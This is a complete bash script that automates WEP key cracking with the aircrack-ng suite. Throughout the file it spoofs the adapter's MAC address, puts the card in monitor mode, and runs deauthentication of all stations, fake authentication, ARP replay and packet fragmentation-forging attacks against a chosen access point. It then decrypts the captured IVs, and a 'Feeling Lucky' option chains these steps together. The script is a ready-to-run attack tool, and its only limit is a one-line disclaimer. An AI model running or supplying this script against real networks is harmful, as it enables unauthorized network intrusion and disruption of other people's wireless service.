#!/bin/sh
# Attatatatatatatatack-0.5.sh

	# Fully functional IV capturing and decrypting shell script.
	# Disclaimer: for use on personally owned devices only. 
	# I hold no responsibilities for your actions.

	# Changes
	# Version: 0.5
	#	- Added priviledge elevation.
	#	- Added full path to programs.
	#	- Added ability to specify a device to use.
	#	- Removed the use of files to store input history.
	#	- Used arrays :).
	# Version: 0.4
        #       - Fixed error in code where attack history
        #           pointed to the wrong location.
	#	- Added additional comments.
	# Version: 0.3
	#	- Added temporary file storage.
	#	- Restructured code for better efficiency.
	# Version: 0.2
	#	- Bugs fixed.
	#	- Added "Feeling Lucky" feature.
	# Version: 0.1
	#	- First uploaded to Google Code on 2011/05/16.


airodump=`which airodump-ng`
aireplay=`which aireplay-ng`
aircrack=`which aircrack-ng`
packetforge=`which packetforge-ng`
macchanger=`which macchanger`
ifconfig=`which ifconfig`
iwconfig=`which iwconfig`
iw=`which iw`
rm=`which rm`

if [ `id | grep -o "uid=[0-9]\{1,\}" | sed 's/uid=//'` -gt 0 ]; then
    airodump="sudo $airodump"
    aireplay="sudo $aireplay"
    aircrack="sudo $aircrack"
    macchanger="sudo $macchanger"
    ifconfig="sudo $ifconfig"
    iwconfig="sudo $iwconfig"
    iw="sudo $iw"
    rm="sudo $rm"
fi

tmp=/tmp/Attatatatatatatatack
mkdir -p $tmp
ivs=$tmp/*.ivs 
replay=$tmp/replay*
fragment=$tmp/fragment*
arp=$tmp/arp-request*
cleanup() {
    $rm $ivs 
    $rm $fragment 
    $rm $arp
    $rm $replay
    clear
}

cd $tmp

#trap "cleanup" 0
trap "clear" INT
clear

# Select interface
wlans=("" `$ifconfig -a | grep -o "wlan."`)
wlanmacs=("" `$ifconfig -a | grep "wlan" | sed -e 's/^.*HWaddr //' -e 's/[ ]*$//'`)
i=1

echo -e "\v   #  Device\tMAC\v"
    
while [ $i -lt ${#wlans[*]} ]; do
    echo -e "   $i  ${wlans[$i]}\t${wlanmacs[$i]}"
    let i++
done

if [ ${#wlans[*]} -eq 2 ]; then
    echo -e "\v\v There's only one wireless adapter. Automatically selecting it."
    i=1
    # if only one interface default to it
else
    echo; read -p "Index number of source device ? " i
fi

wlan=${wlans[$i]}
wlanmac=${wlanmacs[$i]}
$ifconfig $wlan down && $iwconfig $wlan mode managed && $ifconfig $wlan up	# Make sure mode is managed
echo -e "\v\t\tSelected device: [ $wlan ]\v\v"

# Spoof MAC
read -p " Spoof $wlan MAC ? (yn) " answer
case $answer in
    y ) $ifconfig $wlan down; echo -e "\vSpoof MAC address:"
	select answer in "Automatically" "Specify" "Cancel"; do
	case $answer in
	    Automatically )	$macchanger -e $wlan; break;;
	    Specify )	read -p "Enter MAC: " mac; $macchanger -m $mac $wlan; break;;
	    Cancel )	break;;
	esac; done
esac



# Select BSSID/ESSID
selectbssidessid() {
$ifconfig $wlan down && $iwconfig $wlan mode monitor && $ifconfig $wlan up && $airodump $wlan	# use $airodump

echo -e "\v\vScannning for wireless networks in progress...\v"
$ifconfig $wlan down && $iwconfig $wlan mode managed && $ifconfig $wlan up	# use $iw

$iw $wlan scan passive > $tmp/iwscan

if [ "$?" -eq 0 ]; then
    $iw $wlan scan passive > $tmp/iwscan
fi


bssids=("" `cat $tmp/iwscan | grep "^BSS" | sed -e 's/BSS.//' -e 's/.(.*$//'`)
channels=("" `cat $tmp/iwscan | grep "DS Parameter set" | sed -e 's/^.*channel.//'`)
signalStrength=("" `cat $tmp/iwscan | grep "signal" | sed -e 's/^.*: //' -e 's/.dBm.*$//'`)
encryptionType=("" ``)
essids=("" `cat $tmp/iwscan | grep SSID | sed -e 's/^.*:.//' -e 's/[ ]/[_]/g'`)
keys=("" ``)

i=1
echo -e "\v   #\tBSSID\t\t\tCh.#\tPower\tESSID\t\tKey\v"
while [ $i -lt ${#bssids[*]} ]; do
    echo -e "   $i\t${bssids[$i]}\t${channels[$i]}\t${signalStrength[$i]}\t${essids[$i]}\t${keys[$i]}"
    let i++
done
echo; read -p "Index number of source device ? " i	# Select router
bssid=${bssids[$i]}
essid=${essids[$i]}
channel=${channels[$i]}
key=${keys[$i]}		# if exists in database

# Save selection
echo "bssid=$bssid" > $tmp/lastusedrouter
echo "essid=$essid" >> $tmp/lastusedrouter
echo "channel=$channel" >> $tmp/lastusedrouter
echo "key=$key" >> $tmp/lastusedrouter
}

# Use lastusedrouter
if [ -a $tmp/lastusedrouter ]; then
    echo -e "\vUse last used router?"
    select uselast in "Yes" "No"; do
    case $uselast in
	Yes )
	    bssid=`grep bssid $tmp/lastusedrouter | sed 's/bssid=//'`
	    essid=`grep essid $tmp/lastusedrouter | sed 's/essid=//'`
	    channel=`grep channel $tmp/lastusedrouter | sed 's/channel=//'`
	    key=`grep key $tmp/lastusedrouter | sed 's/key=//'`
	    break
	    ;;
	No )selectbssidessid; break;;
    esac; done
else
    selectbssidessid
fi

# Verify
echo
echo "You selected:"
echo -e "\tBSSID: $bssid"
echo -e "\tChannel: $channel"
echo -e "\tESSID: $essid"
echo
echo "From scan:"
#echo -e "\t`grep -E "$bssid.*^BSS" $tmp/iwscan`"
echo -e "\t`grep -E "$bssid" $tmp/iwscan`\v\v"
#echo; echo "Do the selection match ? "
#select yn in "Yes" "No"; do
#case $yn in
#    Yes ) $ifconfig $wlan down && $iwconfig $wlan mode monitor && $ifconfig $wlan up && echo -e "\v\v" && break;;
#    No ) echo Well, looks like you have some debugging to do.; exit $?;;
#esac
#done
$ifconfig $wlan down && $iwconfig $wlan mode monitor && $ifconfig $wlan up


# standard attack
airodumpng() {
    $airodump --bssid $bssid --channel $channel \
	--ivs -w $tmp/$essid $wlan
}
airodumpng9() {
    xterm -e $airodump --bssid $bssid --channel $channel \
	--ivs -w $tmp/$essid $wlan &
}
aireplayng0 () {
    $aireplay -0 10 -a $bssid $wlan
}
aireplayng1() {
    $aireplay -1 0 -a $bssid $wlan
}
aireplayng3() {
    xterm -e $aireplay -3 -b $bssid $wlan &
}
aircrackng() {
    $aircrack -1 -b $bssid -e $essid $tmp/$essid*.ivs   
}


# fragmentation attack
aireplayng5() {
    $aireplay -5 -b $bssid $wlan
}
packetforgeng() {
    $packetforge -0 -a $bssid -h $host -k 255.255.255.255 \
	-l 255.255.255.255 -y fragment*.xor -w $tmp/arp-request
}
aireplayng2() {
    $aireplay -2 -r $arp $wlan
}


lucky() {
    airodumpng9
    aireplayng1
    echo -e "\v\v************************"
    echo -e "PRESS C^c to stop attack"
    echo -e "************************\v\v"
    aireplayng3
    keepingoing=0
    until [ "$keepgoing" == 1 ]; do
	echo Run aircrack?
	select again in "Yes" "No"; do
	case $again in
	    Yes ) aircrackng; break;;
	    No ) keepgoing=1; break;;
	esac; done
    done
}


i=0
runattack="-1"
until [ "$i" -eq "1" ]; do

    echo "Select an option"


    echo "** Standard Attack **"
    echo "[0] airodump-ng (bash)"
    echo "[9] airodump-ng (xterm)"
    echo "[1] aireplay -0 deauthenticate all stations"
    echo "[2] aireplay -1 fake authentication with AP"
    echo "[3] aireplay -3 standard ARP-request replay"
    echo "[4] aircrack-ng decrypt IVs"

    echo
    echo "** Fragmentation Attack **"
    echo "[6] aireplay -5 generate valid keystream"
    echo "[7] packetforge-ng create arp request packet"
    echo "[8] aireplay -2 replay arp request packet"
    echo
    echo "[10] I'm Feeling Lucky (experimental)"
    echo
    echo "[c] Cleanup"
    echo
    echo "[11] Quit."
    echo
    read -p "Choose an attack: " runattack


    if [ "$runattack" == "0" ]; then
	airodumpng
	clear
    fi
    if [ "$runattack" == "1" ]; then
	clear
	aireplayng0
	clear
    fi	
    if [ "$runattack" == "2" ]; then
	clear
	aireplayng1
	sleep 1
	clear
    fi	
    if [ "$runattack" == "3" ]; then
	clear
	aireplayng3
	clear
    fi
    if [ "$runattack" == "4" ]; then
	clear
	aircrackng
	read -p "Press enter to continue..."
	clear
    fi	
    if [ "$runattack" == "6" ]; then
	clear
	aireplayng5
	read -p "Press any key to continue..."
	clear
    fi
    if [ "$runattack" == "7" ]; then
	clear
	packetforgeng
	read -p "Forging complete! Now go replay it!"
	clear
    fi	
    if [ "$runattack" == "8" ]; then
	clear
	aireplayng2
    fi	
    if [ "$runattack" == "9" ]; then
	clear
	airodumpng9
    fi	
    if [ "$runattack" == "10" ]; then
	clear
	lucky
	clear
    fi
    if [ "$runattack" == "c" ]; then
	clear
	cleanup
	clear
    fi
    if [ "$runattack" == "11" ] ; then
	$ifconfig $wlan down && $iwconfig $wlan mode managed && $ifconfig $wlan up
	echo "We're done here."
	i=1
    fi

done